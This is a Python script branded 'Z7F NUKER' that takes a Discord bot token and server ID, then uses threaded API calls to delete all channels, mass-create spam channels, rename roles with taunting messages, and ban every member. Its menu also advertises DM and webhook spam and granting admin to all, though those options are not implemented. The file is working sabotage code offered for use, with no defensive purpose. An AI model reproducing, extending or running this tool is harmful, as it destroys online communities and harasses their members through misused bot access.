import requests
import threading
import os
import time
from colorama import Fore, Style, init

init(autoreset=True)

# بيانات ثابتة للحفظ أثناء التشغيل
saved_data = {"token": "", "guild_id": ""}

# شعار مصغر ومناسب لشاشة الجوال
LOGO = f"""{Fore.RED}
  Z7F NUKER | V1.0
  ----------------
  By: XxX Group
  ----------------{Style.RESET_ALL}"""

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

class NukerActions:
    def __init__(self, token):
        self.token = token
        self.headers = {'Authorization': f'Bot {token}'}
        self.base_url = "https://discord.com/api/v9"

    def delete_channel(self, channel_id):
        requests.delete(f"{self.base_url}/channels/{channel_id}", headers=self.headers)

    def create_channel(self, guild_id):
        payload = {"name": "BN3AL-XxX-6666-Group", "type": 0}
        requests.post(f"{self.base_url}/guilds/{guild_id}/channels", headers=self.headers, json=payload)

    def change_role(self, guild_id, role_id):
        payload = {"name": "#KILLED BY XxX."}
        requests.patch(f"{self.base_url}/guilds/{guild_id}/roles/{role_id}", headers=self.headers, json=payload)

    def ban_member(self, guild_id, member_id):
        requests.put(f"{self.base_url}/guilds/{guild_id}/bans/{member_id}", headers=self.headers, json={"delete_message_days": "7", "reason": "ختفووو برا يلا | XxX"})

def menu():
    clear()
    print(LOGO)
    
    # طلب البيانات إذا لم تكن موجودة
    if not saved_data["token"]:
        saved_data["token"] = input(f"{Fore.WHITE} [>] Bot Token: ")
    if not saved_data["guild_id"]:
        saved_data["guild_id"] = input(f"{Fore.WHITE} [>] Guild ID: ")
    
    actions = NukerActions(saved_data["token"])
    gid = saved_data["guild_id"]

    print(f"\n{Fore.CYAN}--- MAIN MENU ---")
    options = [
        "FULL NUKE", "ROLES NUKE", "CHANNEL NUKE", "SPAM WEBHOOK",
        "SPAM DM", "KICK BOTS", "TIMEOUT ALL", "BAN ALL",
        "ADMIN ALL", "SPAM EMBED"
    ]
    
    for i, opt in enumerate(options, 1):
        print(f" {Fore.YELLOW}[{i}] {opt}")
    
    choice = input(f"\n{Fore.WHITE} [?] Choice: ")

    print(f"{Fore.GREEN} [*] Running task... Please wait.")

    # منطق التنفيذ (أمثلة سريعة)
    if choice == "3": # Channel Nuke
        r = requests.get(f"https://discord.com/api/v9/guilds/{gid}/channels", headers=actions.headers)
        if r.status_code == 200:
            for ch in r.json():
                threading.Thread(target=actions.delete_channel, args=(ch['id'],)).start()
            for _ in range(30):
                threading.Thread(target=actions.create_channel, args=(gid,)).start()
    
    elif choice == "8": # Ban All
        r = requests.get(f"https://discord.com/api/v9/guilds/{gid}/members?limit=1000", headers=actions.headers)
        if r.status_code == 200:
            for member in r.json():
                threading.Thread(target=actions.ban_member, args=(gid, member['user']['id'],)).start()

    # بعد الانتهاء
    input(f"\n{Fore.CYAN} [!] Done! Press Enter to return...")
    menu() # العودة للقائمة

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print("\nExiting...")
